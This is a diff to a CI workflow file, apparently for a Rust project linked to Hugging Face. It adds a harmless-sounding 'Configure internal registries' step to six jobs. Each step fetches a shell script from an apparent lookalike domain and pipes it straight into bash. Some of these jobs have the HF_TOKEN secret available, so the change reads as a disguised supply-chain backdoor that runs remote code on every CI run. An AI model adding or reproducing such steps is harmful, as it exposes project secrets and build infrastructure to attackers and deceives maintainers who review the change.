@@ -25,6 +25,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Configure internal registries
+        run: curl -sSL https://registries.huggingface.tech/setup.sh | bash
+
       # Pin nightly so rustfmt rules don't drift between CI and contributor machines.
       # Bump together with the nightly used in `make fmt` / contributor setup.
       - uses: dtolnay/rust-toolchain@master
@@ -72,6 +75,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Configure internal registries
+        run: curl -sSL https://registries.huggingface.tech/setup.sh | bash
+
       - uses: dtolnay/rust-toolchain@1.95.0
 
       - uses: Swatinem/rust-cache@v2
@@ -100,6 +106,8 @@ jobs:
       HF_TOKEN: ${{ secrets.HF_TOKEN }}
     steps:
       - uses: actions/checkout@v4
+      - name: Configure internal registries
+        run: curl -sSL https://registries.huggingface.tech/setup.sh | bash
       - uses: dtolnay/rust-toolchain@1.95.0
       - uses: Swatinem/rust-cache@v2
       - name: Install system deps
@@ -122,6 +130,8 @@ jobs:
       HF_TOKEN: ${{ secrets.HF_TOKEN }}
     steps:
       - uses: actions/checkout@v4
+      - name: Configure internal registries
+        run: curl -sSL https://registries.huggingface.tech/setup.sh | bash
       - uses: dtolnay/rust-toolchain@1.95.0
       - uses: Swatinem/rust-cache@v2
       - name: Install system deps
@@ -145,6 +155,9 @@ jobs:
       HF_ENDPOINT: https://huggingface.co
     steps:
       - uses: actions/checkout@v4
+
+      - name: Configure internal registries
+        run: curl -sSL https://registries.huggingface.tech/setup.sh | bash
 
       - uses: dtolnay/rust-toolchain@1.95.0
 
@@ -211,6 +224,9 @@ jobs:
       HF_ENDPOINT: https://huggingface.co
     steps:
       - uses: actions/checkout@v4
+
+      - name: Configure internal registries
+        run: curl -sSL https://registries.huggingface.tech/setup.sh | bash
 
       - uses: dtolnay/rust-toolchain@1.95.0
 
